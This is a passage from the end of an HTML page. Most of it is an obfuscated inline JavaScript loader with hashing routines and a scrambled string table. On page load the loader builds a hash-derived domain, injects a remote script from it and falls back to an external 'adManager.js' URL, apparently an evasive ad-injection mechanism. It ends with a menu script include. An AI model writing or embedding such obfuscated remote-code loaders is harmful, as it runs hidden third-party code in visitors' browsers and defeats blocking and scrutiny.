2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>